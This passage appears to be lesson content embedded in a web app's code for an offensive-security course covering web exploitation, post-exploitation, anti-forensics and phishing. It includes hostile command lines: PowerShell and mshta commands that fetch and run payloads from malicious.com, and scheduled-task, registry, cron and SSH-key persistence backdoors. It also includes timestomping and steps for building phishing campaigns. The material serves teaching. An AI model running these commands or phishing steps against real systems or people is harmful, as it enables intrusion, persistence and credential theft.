                            <p class="pl-6 mb-4"><strong>Exploit a Blind SQLi Vulnerability:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use sqlmap to exploit a blind SQL injection vulnerability in a demo web app.</li>
                                <li>Extract data such as usernames and passwords using time-based techniques.</li>
                            </ul>
                
                            <h5 class="font-bold">2. Out-of-Band SQL Injection</h5>
                            <p class="pl-6 mb-4">Out-of-Band SQL Injection occurs when attackers can trigger actions (e.g., DNS lookups or HTTP requests) from the database to retrieve data. This technique is used when normal channels (e.g., HTTP response) are blocked or restricted.</p>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p class="pl-6 mb-4"><strong>Out-of-Band SQLi Attack:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Set up a vulnerable web app and use Burp Suite to send crafted SQL queries that trigger DNS requests to an attacker-controlled server.</li>
                                <li>Capture the requests on your server to extract sensitive data.</li>
                            </ul>
                        `},
                    {
                        title: 'Part :2 Advanced Exploitation: SSRF, Host Header Attacks, and Authentication Mechanisms',
                        content: `
                            <h4 class="font-bold">2. Server-Side Request Forgery (SSRF) and Host Header Attacks</h4>
                
                            <h5 class="font-bold">1. Server-Side Request Forgery (SSRF)</h5>
                            <p class="pl-6 mb-4">SSRF vulnerabilities occur when an application allows an attacker to manipulate server-side requests, leading to internal network scans, data exfiltration, or even remote code execution.</p>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p class="pl-6 mb-4"><strong>SSRF Exploitation:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Find an SSRF vulnerability in a demo application and use it to access internal resources.</li>
                                <li>Document how this vulnerability can be leveraged to perform internal scans or access sensitive data.</li>
                            </ul>
                
                            <h5 class="font-bold">2. Host Header Attacks</h5>
                            <p class="pl-6 mb-4">Host Header Attacks exploit the trust that some web servers place on the Host header in HTTP requests. Attackers can manipulate the header to trick the server into serving sensitive resources or generating cross-site links.</p>
                
                            <h4 class="font-bold">Host Header Attack:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use Burp Suite to manipulate the Host header in an HTTP request and perform a successful Host Header Attack.</li>
                                <li>Explain the impact of this vulnerability in terms of security.</li>
                            </ul>
                
                            <h5 class="font-bold">3. Exploiting Authentication Mechanisms: JWT, OAuth, and SAML</h5>
                
                            <h6 class="font-bold">1. JWT (JSON Web Tokens)</h6>
                            <p class="pl-6 mb-4">JWT is widely used for stateless authentication, but poor implementation (e.g., weak signing algorithms, token manipulation) can lead to critical security vulnerabilities.</p>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p class="pl-6 mb-4"><strong>JWT Manipulation:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use Burp Suite to modify the JWT token payload and trick the server into granting unauthorized access.</li>
                            </ul>
                        `},
                    {
                        title: 'OAuth, SAML, Case Studies, and Assignments',
                        content: `
                            <h4 class="font-bold">2. OAuth</h4>
                            <p class="pl-6 mb-4">OAuth is an open standard for access delegation, but improper implementation can result in OAuth misconfiguration attacks, where attackers hijack or manipulate OAuth tokens.</p>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p class="pl-6 mb-4"><strong>OAuth Exploitation:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Exploit a misconfigured OAuth implementation to gain unauthorized access to resources.</li>
                            </ul>
                
                            <h4 class="font-bold">3. SAML (Security Assertion Markup Language)</h4>
                            <p class="pl-6 mb-4">SAML is used for single sign-on (SSO), but vulnerabilities like signature wrapping attacks can lead to unauthorized access.</p>
                
                            <h4 class="font-bold">SAML Attack:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Analyze a vulnerable SAML-based authentication system and perform a signature wrapping attack to gain unauthorized access.</li>
                            </ul>
                
                            <h4 class="font-bold">4. Case Studies of High-Profile Web Exploitation Incidents</h4>
                            
                            <h5 class="font-bold">1. Capital One Data Breach (2019)</h5>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Vulnerability:</strong> Misconfigured web application firewall (WAF) combined with SSRF allowed attackers to access Amazon S3 buckets.</li>
                                <li><strong>Impact:</strong> Exposed personal information of over 100 million users.</li>
                                <li><strong>Lessons Learned:</strong> Properly configuring firewalls and implementing least privilege access to cloud resources could have prevented this breach.</li>
                            </ul>
                
                            <h5 class="font-bold">2. Yahoo Data Breaches (2013-2014)</h5>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Vulnerability:</strong> Weak encryption and inadequate security controls led to multiple breaches.</li>
                                <li><strong>Impact:</strong> Stolen credentials and personal data of over 3 billion accounts.</li>
                                <li><strong>Lessons Learned:</strong> Use of strong encryption techniques and multi-factor authentication could have mitigated this attack.</li>
                            </ul> 
                            `
                        },
                        {
                            title: 'Assignment: Web Exploitation Case Study',
                            content: `
                            <h4 class="font-bold">Assignment for Week 1 and Week 2:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Week 1:</strong> Perform an SMB exploitation using Metasploit on a vulnerable machine (e.g., Metasploitable2). Document the exploit process and the results.</li>
                                <li><strong>Week 2:</strong> Exploit a JWT or OAuth vulnerability in a web application using Burp Suite. Write a report detailing how the vulnerability was exploited and what mitigations should be implemented.</li>
                            </ul>
                
                            <h4 class="font-bold">Additional Reading:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Book:</strong> "The Tangled Web: A Guide to Securing Modern Web Applications" by Michal Zalewski — An in-depth exploration of web security vulnerabilities and defenses.</li>
                                <li><strong>Video Tutorial:</strong> "Advanced Metasploit Framework" by Offensive Security — Learn advanced exploitation techniques using the Metasploit framework.</li>
                            </ul>
                
                            <h4 class="font-bold">Next Week Preview:</h4>
                            <p class="pl-6 mb-4">Next week, we will focus on Post-Exploitation Techniques, where we will learn how to maintain access to compromised systems, escalate privileges, and exfiltrate sensitive data.</p>
                            `
                        }
                        ],
                        videoUrl: 'https://example.com/advanced-network-exploitation-video',
                        commands: [],
                        content: ''
                },
                {
                id: "module-7",
                title: 'Module 9 - Post-Exploitation Techniques ',
                icon: Shield,
                sections: [
                    {
                        title: 'Week 1:Persistence and Privilege Escalation',
                        content: `
                            <h4 class="font-bold">Part: Persistence and Privilege Escalation</h4>
                            <p class="pl-6 mb-4">This module covers critical post-exploitation techniques that allow attackers to maintain access to compromised systems, escalate privileges, and exfiltrate data. Post-exploitation is the phase where attackers solidify their control, evade detection, and extract valuable information from the target system. We will explore techniques for maintaining persistence in Windows and Linux, methods for privilege escalation, and advanced topics such as fileless malware and Living off the Land (LoL) attacks. Additionally, we’ll discuss data exfiltration techniques and antiforensics strategies used by attackers to cover their tracks.</p>
                
                            <h4 class="font-bold">Topics Covered:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Maintaining access in compromised systems: Persistence techniques in Windows and Linux.</li>
                                <li>Privilege escalation in Windows, Linux, and web applications.</li>
                                <li>Advanced post-exploitation: Fileless malware, Living off the Land (LoL).</li>
                                <li>Data exfiltration techniques and anti-forensics.</li>
                            </ul>
                
                            <h4 class="font-bold">1. Maintaining Access in Compromised Systems: Persistence Techniques in Windows and Linux</h4>
                            <p class="pl-6 mb-4">Persistence refers to techniques attackers use to maintain access to compromised systems across reboots or logouts. By establishing persistence, attackers ensure they can return to the compromised machine even after the initial access is closed or removed.</p>
                
                            <h4 class="font-bold">Persistence Techniques in Windows</h4>
                            <p class="pl-6 mb-4">1. Scheduled Tasks</p>
                            <p class="pl-6 mb-4">Attackers create scheduled tasks that automatically execute malware or reverse shells at specific intervals or on system startup.</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Command Example:</strong> schtasks /create /tn "PersistentTask" /tr "powershell.exe -c StartProcess nc.exe" /sc onstart</li>
                            </ul>
                
                            <p class="pl-6 mb-4">2. Registry Modification</p>
                            <p class="pl-6 mb-4">Attackers often modify the Windows Registry to ensure that malware or backdoors start with the system. The Run and RunOnce keys are commonly targeted.</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Key Locations:</strong></li>
                                <li>HKCU/Software/Microsoft/Windows/CurrentVersion/Run </li>
                                <li>HKLM/Software/Microsoft/Windows/CurrentVersion/Run</li>
                                <li><strong>Command Example:</strong> reg add HKCU/Software/Microsoft/Windows/CurrentVersion/Run /v "Persistence" /t REG_SZ /d "C:/malicious.exe" /f</li>
                            </ul>
                
                            <p class="pl-6 mb-4">3. WMI Event Subscription</p>
                            <p class="pl-6 mb-4">Windows Management Instrumentation (WMI) subscriptions allow attackers to trigger actions based on system events, providing a powerful persistence mechanism that is harder to detect.</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Tools:</strong> Metasploit's persistence module: Automates the process of adding persistence on Windows systems.</li>
                            </ul>
                        `},
                        {
                            title: 'Part:2 Persistence Techniques in Linux',
                            content: `
                                <h4 class="font-bold">Persistence Techniques in Linux</h4>
                                <p class="pl-6 mb-4">1. Cron Jobs</p>
                                <p class="pl-6 mb-4">Attackers can create cron jobs to run malicious scripts or reverse shells at regular intervals on Linux systems.</p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Cron Job Example:</strong> echo "*/5 * * * * /bin/bash /tmp/backdoor.sh" >> /etc/crontab</li>
                                </ul>
                    
                                <p class="pl-6 mb-4">2. SSH Key Injection</p>
                                <p class="pl-6 mb-4">Attackers place their public SSH key in the victim’s ~/.ssh/authorized_keys file, allowing persistent SSH access.</p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>SSH Key Injection Example:</strong> echo "attacker_public_key" >> ~/.ssh/authorized_keys</li>
                                </ul>
                    
                                <p class="pl-6 mb-4">3. Rootkits</p>
                                <p class="pl-6 mb-4">Rootkits are advanced persistence techniques that modify the core functionality of the system (such as kernel modules) to hide the attacker’s presence and maintain long-term access.</p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Tools:</strong> Persistence Scripts: Tools like KeeThief automate persistence mechanisms on Linux, while rootkits like KBeast or Tuxkit provide advanced capabilities.</li>
                                </ul>
                    
                                <h4 class="font-bold">Practical Activity:</h4>
                                <p class="pl-6 mb-4 font-bold">Windows Persistence:</p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>Set up a persistence mechanism by creating a scheduled task or modifying the Windows Registry.</li>
                                    <li>Test if the backdoor or reverse shell survives a system reboot.</li>
                                </ul>
                                <p class="pl-6 mb-4 font-bold">Linux Persistence:</p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>Create a persistent backdoor on a Linux machine using cron jobs or SSH key injection.</li>
                                    <li>Verify persistence by restarting the system and checking access.</li>
                                </ul>
                            `},
                            {
                                title: 'Part:3 Privilege Escalation in Windows, Linux, and Web Applications',
                                content: `
                                    <h4 class="font-bold">Privilege Escalation in Windows, Linux, and Web Applications</h4>
                                    <p class="pl-6 mb-4">Privilege escalation is the process of gaining higher-level permissions (e.g., admin or root) after compromising a system. Attackers seek to escalate their privileges to gain full control over the system or network.</p>
                        
                                    <h4 class="font-bold">Privilege Escalation in Windows</h4>
                                    <p class="pl-6 mb-4">1. Exploiting Weak Service Configurations</p>
                                    <p class="pl-6 mb-4">Services running with SYSTEM or Administrator privileges that have improper configurations, such as unquoted service paths or writeable directories, can be exploited to escalate privileges.</p>
                                    <ul class="list-disc pl-6 mb-4">
                                        <li><strong>Unquoted Service Path Exploit:</strong> If the service path has spaces and is unquoted (e.g., C:\\Program Files\\Vulnerable Service\\service.exe), an attacker can place a malicious executable in C:\\Program.exe, which will run with SYSTEM privileges.</li>
                                    </ul>
                        
                                    <p class="pl-6 mb-4">2. Exploiting Token Impersonation</p>
                                    <p class="pl-6 mb-4">Windows allows certain processes to impersonate tokens (e.g., NT AUTHORITY\\SYSTEM). Attackers can steal these tokens to escalate privileges.</p>
                                    <ul class="list-disc pl-6 mb-4">
                                        <li><strong>Tools:</strong> Windows Exploit Suggester: Identifies missing patches or privilege escalation opportunities.</li>
                                        <li>PowerUp: A PowerShell tool for privilege escalation on Windows.</li>
                                    </ul>
                        
                                    <h4 class="font-bold">Practical Activity:</h4>
                                    <p class="pl-6 mb-4">• Use PowerUp to identify and exploit a privilege escalation vulnerability on a Windows machine.</p>
                        
                                    <h4 class="font-bold">Privilege Escalation in Linux</h4>
                                    <p class="pl-6 mb-4">1. SUID/SGID Programs</p>
                                    <p class="pl-6 mb-4">Files with the SUID (Set-User-ID) or SGID (Set-Group-ID) bits set allow normal users to run these programs with elevated privileges. Attackers can exploit misconfigured or vulnerable SUID programs to escalate privileges.</p>
                                    <ul class="list-disc pl-6 mb-4">
                                        <li><strong>Find SUID Files:</strong> find / -perm -u=s -type f 2>/dev/null</li>
                                    </ul>
                        
                                    <p class="pl-6 mb-4">2. Kernel Exploits</p>
                                    <p class="pl-6 mb-4">Exploiting vulnerabilities in older Linux kernels can allow attackers to escalate privileges. Tools like Dirty COW (CVE-2016-5195) exploit race conditions in kernel memory to escalate privileges.</p>
                        
                                    <p class="pl-6 mb-4">3. Misconfigured Permissions</p>
                                    <p class="pl-6 mb-4">Attackers can abuse misconfigured files, directories, or user permissions to gain unauthorized access to root-level files or escalate privileges.</p>
                                    <ul class="list-disc pl-6 mb-4">
                                        <li><strong>Tools:</strong> LinPEAS: A powerful script for enumerating potential privilege escalation vectors in Linux.</li>
                                        <li>GTFOBins: A repository of Unix binaries that attackers can exploit for privilege escalation.</li>
                                    </ul>
                        
                                    <h4 class="font-bold">Practical Activity:</h4>
                                    <p class="pl-6 mb-4">• Use LinPEAS to find and exploit a SUID or misconfigured permissions vulnerability on a Linux machine.</p>
                                `},
                                {
                                    title: 'Part:4 Privilege Escalation in Web Applications',
                                    content: `
                                        <h4 class="font-bold">Privilege Escalation in Web Applications</h4>
                                        <p class="pl-6 mb-4">1. Horizontal Privilege Escalation</p>
                                        <p class="pl-6 mb-4">Occurs when an attacker accesses another user’s account by exploiting flaws in session management, authentication, or access control mechanisms.</p>
                            
                                        <p class="pl-6 mb-4">2. Vertical Privilege Escalation</p>
                                        <p class="pl-6 mb-4">An attacker escalates their privileges to access resources reserved for higher-privileged users (e.g., a standard user accessing an admin panel).</p>
                            
                                        <h4 class="font-bold">Techniques:</h4>
                                        <ul class="list-disc pl-6 mb-4">
                                            <li><strong>Insecure Direct Object References (IDOR):</strong> Improper access control over objects or files that allow unauthorized access to sensitive resources.</li>
                                            <li><strong>Exploiting Misconfigured APIs:</strong> Attackers abuse vulnerable APIs that allow privilege escalation due to insufficient validation.</li>
                                        </ul>
                            
                                        <h4 class="font-bold">Practical Activity:</h4>
                                        <p class="pl-6 mb-4">• Perform an IDOR attack on a vulnerable web application (such as DVWA) to access or modify data belonging to another user.</p>
                            
                                        <h4 class="font-bold">Advanced Post-Exploitation: Fileless Malware, Living off the Land (LoL)</h4>
                                        <p class="pl-6 mb-4">1. Fileless Malware</p>
                                        <p class="pl-6 mb-4">Fileless malware resides in system memory without leaving a footprint on the disk. Attackers use techniques like injecting malicious code into legitimate processes or leveraging scripting environments (e.g., PowerShell, WMI) to avoid detection.</p>
                            
                                        <h4 class="font-bold">Techniques:</h4>
                                        <ul class="list-disc pl-6 mb-4">
                                            <li><strong>PowerShell Abuse:</strong> Running malicious PowerShell scripts entirely in memory using techniques like Invoke-Mimikatz.</li>
                                            <li><strong>Process Hollowing:</strong> Injecting malicious code into legitimate processes (e.g., svchost.exe) to evade detection by security tools.</li>
                                        </ul>
                            
                                        <h4 class="font-bold">Tools:</h4>
                                        <ul class="list-disc pl-6 mb-4">
                                            <li><strong>Cobalt Strike:</strong> Provides advanced capabilities for fileless attacks and in-memory postexploitation.</li>
                                        </ul>
                            
                                        <h4 class="font-bold">Practical Activity:</h4>
                                        <p class="pl-6 mb-4">• Use Cobalt Strike or Metasploit to launch a fileless attack and execute commands on the target without writing files to disk.</p>
                                    `},
                        {
                            title: 'Part: 4 Living off the Land (LoL) and Data Exfiltration Techniques',
                            content: `
                                <h4 class="font-bold">Living off the Land (LoL)</h4>
                                <p class="pl-6 mb-4">Living off the Land (LoL) attacks involve using legitimate tools and system features (e.g., PowerShell, WMI, mshta.exe) to perform malicious activities, making detection difficult for traditional security solutions.</p>
                        
                                <h4 class="font-bold">Examples of LoL Techniques:</h4>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>PowerShell:</strong> Execute reverse shells or exfiltrate data using legitimate PowerShell commands.
                                    <pre class="pl-6 mb-4">powershell -nop -exec bypass -c "IEX </pre>
                                    <pre>(New-Object Net.WebClient).DownloadString('http://malicious.com/shell.ps1')" </pre>
                                    </li>
                                    <li><strong>Mshta.exe:</strong> Used to run malicious HTA files (HTML applications).
                                        <pre class="pl-6 mb-4">mshta http://malicious.com/malware.hta</pre>
                                    </li>
                                </ul>
                        
                                <h4 class="font-bold">Practical Activity:</h4>
                                <p class="pl-6 mb-4">• Perform a Living off the Land attack by abusing PowerShell to execute malicious commands while evading detection.</p>
                        
                                <h4 class="font-bold">Data Exfiltration Techniques and Anti-Forensics</h4>
                                <h4 class="font-bold">Data Exfiltration Techniques</h4>
                                <p class="pl-6 mb-4">Once access is gained, attackers often exfiltrate sensitive data such as intellectual property, credentials, or financial records. Various techniques can be used to avoid detection during data exfiltration.</p>
                        
                                <h4 class="font-bold">Common Techniques:</h4>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>DNS Tunneling:</strong> Exfiltrate data by embedding it into DNS queries, which are less likely to be blocked or monitored.</li>
                                    <li><strong>Steganography:</strong> Hide sensitive data inside images, audio files, or other media to avoid detection.</li>
                                    <li><strong>Compression and Encryption:</strong> Compress and encrypt data before transferring it to an external server to evade data loss prevention (DLP) systems.</li>
                                </ul>
                        
                                <h4 class="font-bold">Practical Activity:</h4>
                                <p class="pl-6 mb-4">• Use DNS Tunneling to exfiltrate data from a compromised machine by embedding the data in DNS queries.</p>
                        
                                <h4 class="font-bold">Anti-Forensics Techniques</h4>
                                <p class="pl-6 mb-4">Attackers use anti-forensics techniques to evade detection, avoid leaving traces, and make forensic analysis difficult. These techniques include altering logs, modifying timestamps, and removing evidence.</p>
                        
                                <h4 class="font-bold">Common Anti-Forensics Methods:</h4>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Log Tampering:</strong> Modify or delete system logs to remove traces of the attack.</li>
                                    <li><strong>Timestomping:</strong> Alter the timestamps on files to make it harder to track malicious activity.</li>
                                    <li><strong>Data Obfuscation:</strong> Use encryption, encoding, or steganography to hide sensitive data.</li>
                                </ul>
                        
                                <h4 class="font-bold">Tools:</h4>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Timestomp (Metasploit):</strong> A tool to modify file timestamps.
                                        <pre class="pl-6 mb-4">timestomp file.txt -m "01/01/2020 12:00:00"</pre>
                                    </li>
                                </ul>
                        
                                <h4 class="font-bold">Practical Activity:</h4>
                                <p class="pl-6 mb-4">• Perform timestomping on a compromised machine to modify the creation and modification times of files, and verify the changes using forensic tools.</p>
                            `},
                            {
                                title: 'Week 1 Assignments and Additional Reading',
                                content: `
                                    <h4 class="font-bold">Assignment for Week 13:</h4>
                                    <p class="pl-6 mb-4">• Persistence Lab: Set up persistence on both a Windows and a Linux system. Document how the persistence mechanism survives a system reboot.</p>
                                    <p class="pl-6 mb-4">• Privilege Escalation Lab: Use LinPEAS or PowerUp to identify and exploit privilege escalation vulnerabilities on a target system. Write a report explaining how you escalated privileges.</p>
                                    <p class="pl-6 mb-4">• Anti-Forensics Lab: Perform timestomping on files and attempt to cover your tracks by deleting system logs. Analyze how these techniques hinder forensic analysis.</p>
                            
                                    <h4 class="font-bold">Additional Reading:</h4>
                                    <ul class="list-disc pl-6 mb-4">
                                        <li><strong>Book:</strong> "The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory" by Michael Hale Ligh — A guide to understanding memory forensics and how attackers use fileless malware and evasion techniques.</li>
                                        <li><strong>Blog:</strong> "Living off the Land Binaries and Scripts (LOLBAS)" — A repository of legitimate binaries and scripts that attackers can abuse for malicious purposes.</li>
                                    </ul>
                            
                                    <h4 class="font-bold">Next Week Preview:</h4>
                                    <p class="pl-6 mb-4">Next week, we will dive into Advanced Social Engineering Techniques, where we will explore phishing campaigns, psychological manipulation tactics, and real-world case studies of successful social engineering attacks.</p>
                                `},
                    {
                        title: 'Week 2: Advanced Social Engineering Techniques',
                        content: `
                            <h4 class="font-bold">Part 1: Advanced Social Engineering Techniques</h4>
                            <p class="pl-6 mb-4">In this week’s module, we will explore the concept of social engineering, a powerful set of techniques that manipulate human psychology to exploit security weaknesses. Social engineering bypasses technological defenses by targeting human behaviors, making it a crucial skill for both attackers and ethical hackers. We’ll cover advanced social engineering strategies, from psychological manipulation to executing effective phishing campaigns. Additionally, we will discuss techniques for bypassing physical security controls and examine case studies of real-world social engineering attacks.</p>
                    
                            <h4 class="font-bold">Topics Covered:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Psychological manipulation in social engineering.</li>
                                <li>Designing and executing phishing campaigns.</li>
                                <li>Bypassing physical security controls.</li>
                                <li>Case studies of real-world social engineering attacks.</li>
                            </ul>
                    
                            <h4 class="font-bold">1. Psychological Manipulation in Social Engineering</h4>
                            <p class="pl-6 mb-4">Social engineering leverages psychological manipulation to convince individuals to disclose sensitive information or perform actions that compromise security. By understanding human behavior, attackers can craft scenarios that trick users into bypassing established security policies.</p>
                    
                            <h4 class="font-bold">Key Psychological Principles in Social Engineering:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Authority:</strong> People tend to obey figures of authority. Attackers can impersonate managers, IT staff, or law enforcement to extract information.
                                    <br/>Example: An attacker pretending to be the IT department calls a target to request their login credentials, citing an urgent system update.
                                </li>
                                <li><strong>Urgency:</strong> Creating a sense of urgency prompts people to act quickly without fully considering the consequences.
                                    <br/>Example: An email claiming the user’s account will be locked unless they reset their password immediately, leading to a phishing page.
                                </li>
                                <li><strong>Trust:</strong> Building a sense of trust makes it easier to manipulate targets.
                                    <br/>Example: An attacker befriends a target through social media over time and eventually convinces them to reveal sensitive corporate information.
                                </li>
                                <li><strong>Reciprocity:</strong> People tend to return favors. Attackers may offer a small gesture to elicit cooperation from the target.
                                    <br/>Example: An attacker gives a free USB drive to an employee, claiming it has useful files, but it actually contains malware.
                                </li>
                                <li><strong>Scarcity:</strong> Limited offers or opportunities can make people act quickly and irrationally.
                                    <br/>Example: A fake promotion claims that only the first 100 employees who respond will get a reward, tricking users into providing personal data.
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Psychological Manipulation Exercise:</strong></li>
                                <ul class="list-inside pl-6 mb-4">
                                    <li>Review a series of phishing emails and identify which psychological principles are being exploited.</li>
                                    <li>Analyze how these principles are applied to manipulate the targets into taking actions against their best interest.</li>
                                </ul>
                            </ul>
                        `},
                {
                    title: 'Part:2 Designing and Executing Phishing Campaigns',
                    content: `
                        <h4 class="font-bold">2. Designing and Executing Phishing Campaigns</h4>
                        <p class="pl-6 mb-4">Phishing is one of the most widely used social engineering techniques, where attackers send fraudulent emails, messages, or calls to deceive users into revealing sensitive information or installing malware. In this section, we will focus on crafting and executing phishing campaigns to simulate real-world attacks.</p>
                
                        <h4 class="font-bold">Types of Phishing:</h4>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Email Phishing: Sending emails that appear to be from trusted entities (e.g., banks, IT departments) but contain malicious links or attachments.</li>
                            <li>Spear Phishing: Targeted phishing where the attacker tailors the message to a specific individual or organization.</li>
                            <li>Whaling: Phishing attacks that target high-level executives, such as CEOs or CFOs.</li>
                            <li>Vishing: Voice phishing, where attackers call individuals pretending to be from trusted organizations to extract information.</li>
                            <li>Smishing: SMS phishing, where attackers use text messages to deceive users into clicking malicious links or disclosing information.</li>
                        </ul>
                
                        <h4 class="font-bold">Key Components of a Phishing Campaign:</h4>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Pretext Creation:</strong> Develop a believable scenario that aligns with the target’s expectations.
                                <br/>Example: Pretend to be the HR department asking employees to update their direct deposit information via a malicious link.
                            </li>
                            <li><strong>Crafting the Email:</strong> Design the phishing email to look as authentic as possible by mimicking the branding, style, and tone of the impersonated entity.
                                <br/><strong>Key Elements:</strong>
                                <ul class="list-inside pl-6 mb-4">
                                    <li>Trustworthy sender address (e.g., spoofed email domain).</li>
                                    <li>Authentic-looking logos, fonts, and formatting.</li>
                                    <li>Call-to-action button (e.g., "Click here to verify your account").</li>
                                </ul>
                            </li>
                            <li><strong>Malicious Payload or Link:</strong> Attach a malicious document or provide a link to a phishing site designed to steal credentials or deliver malware.
                                <br/><strong>Payload Examples:</strong>
                                <ul class="list-inside pl-6 mb-4">
                                    <li>Malware-laden attachments (e.g., fake invoices).</li>
                                    <li>Credential-harvesting websites disguised as login pages.</li>
                                    <li>Macro-enabled documents (e.g., a malicious Microsoft Word file).</li>
                                </ul>
                            </li>
                            <li><strong>Execution and Monitoring:</strong> Send the phishing emails and monitor who clicks the links, submits credentials, or downloads malicious attachments.</li>
                        </ul>
                
                        <h4 class="font-bold">Tools for Phishing Campaigns:</h4>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Gophish:</strong> An open-source phishing framework that automates the creation, execution, and tracking of phishing campaigns.
                                <br/>Command: <code>sudo apt install gophish</code>
                            </li>
                            <li><strong>SET (Social Engineering Toolkit):</strong> A powerful tool for crafting phishing campaigns, email spoofing, and creating fake websites.
                                <br/>Command: <code>sudo apt install set</code>
                            </li>
                        </ul>
                
                        <h4 class="font-bold">Practical Activity:</h4>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Execute a Phishing Campaign:</strong></li>
                            <ul class="list-inside pl-6 mb-4">
                                <li>Use Gophish to design a phishing email targeting a demo environment.</li>
                                <li>Create a fake login page and monitor for credentials submitted by users.</li>
                                <li>Analyze the campaign’s success by reviewing how many users clicked the link or entered their credentials.</li>
                            </ul>
                        </ul>
                    `},
            {
                title: 'Part: 3 Bypassing Physical Security Controls',
                content: `
                    <h4 class="font-bold">3. Bypassing Physical Security Controls</h4>
                    <p class="pl-6 mb-4">Social engineering isn’t limited to virtual attacks—attackers often exploit physical security weaknesses to gain access to restricted areas, servers, or confidential documents. These attacks rely on tricking or manipulating individuals into allowing unauthorized access to secure locations.</p>
            
                    <h4 class="font-bold">Common Physical Security Bypassing Techniques:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li class=" mb-4"><strong>Tailgating:</strong> Following an authorized person into a restricted area without using a personal access card or credentials.
                            <br/>Example: Pretending to be a delivery person and following an employee into a secured office building.
                        </li>
                        <li class=" mb-4"><strong>Badge Cloning:</strong> Attackers can use RFID or NFC scanners to clone access cards used by employees, allowing unauthorized access.
                            <br/>Tools: Devices like the Proxmark3 can capture RFID signals and duplicate access badges.
                        </li>
                        <li class=" mb-4"><strong>Dumpster Diving:</strong> Searching through discarded items for sensitive documents, passwords, or access codes.
                            <br/>Example: An attacker finds employee lists, manuals, or even written-down passwords in the trash that can be used to breach the system.
                        </li>
                        <li class=" mb-4"><strong>Impersonation:</strong> Attackers dress as employees, IT staff, or delivery personnel to gain physical access.
                            <br/>Example: An attacker impersonates a copier technician and gains access to a server room by claiming they need to service a printer.
                        </li>
                        <li class=" mb-4"><strong>USB Drops:</strong> Leaving infected USB drives in parking lots or break rooms in the hope that employees will plug them into work computers, triggering malware execution.
                            <br/>Example: An attacker drops a USB drive labeled “Payroll Information” in a company’s parking lot, and a curious employee plugs it into their system.
                        </li>
                    </ul>
            
                    <h4 class="font-bold">Practical Activity:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Simulate Physical Bypass:</strong></li>
                        <ul class="list-inside pl-6 mb-4">
                            <li>Role-play a tailgating scenario or use badge-cloning techniques (in a controlled environment) to access a restricted area.</li>
                            <li>Document how attackers can exploit human trust to bypass physical security.</li>
                        </ul>
                    </ul>
                `},
            {
                title: 'Part: 4. Case Studies of Real-World Social Engineering Attacks',
                content: `
                    <h4 class="font-bold">4. Case Studies of Real-World Social Engineering Attacks</h4>
                    <p class="pl-6 mb-4">Understanding real-world social engineering attacks helps highlight the devastating impact these techniques can have on organizations. Below are some famous examples of successful social engineering campaigns.</p>
            
                    <h4 class="font-bold">1. The RSA Security Breach (2011)</h4>
                    <p class="pl-6 mb-4"><strong>Attack Overview:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Attackers sent spear-phishing emails to RSA employees, tricking them into opening a malicious Excel file with an embedded Zero-Day exploit.</li>
                        <li>Once inside the network, attackers accessed SecurID token data, which was later used in attacks against other high-profile targets.</li>
                    </ul>
                    <p class="pl-6 mb-4"><strong>Lesson Learned:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Implementing email filtering and educating employees about phishing risks could have prevented the breach.</li>
                        <li>Regular software updates and the use of multi-factor authentication (MFA) would mitigate the effects of stolen authentication tokens.</li>
                    </ul>
            
                    <h4 class="font-bold">2. The Target Data Breach (2013)</h4>
                    <p class="pl-6 mb-4"><strong>Attack Overview:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Attackers used social engineering to compromise an HVAC contractor working with Target. Through phishing emails, they gained credentials to the contractor’s network, allowing them to move laterally into Target’s point-of-sale systems.</li>
                        <li>The attackers installed malware that collected payment card details of over 40 million customers.</li>
                    </ul>
                    <p class="pl-6 mb-4"><strong>Lesson Learned:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Network segmentation could have isolated the contractor’s network from the main system, limiting the attacker’s ability to move laterally.</li>
                        <li>Vendor security is critical, and organizations should enforce strong security policies for third-party vendors.</li>
                    </ul>
            
                    <h4 class="font-bold">3. Ubiquiti Networks Phishing Attack (2015)</h4>
                    <p class="pl-6 mb-4"><strong>Attack Overview:</strong></p>
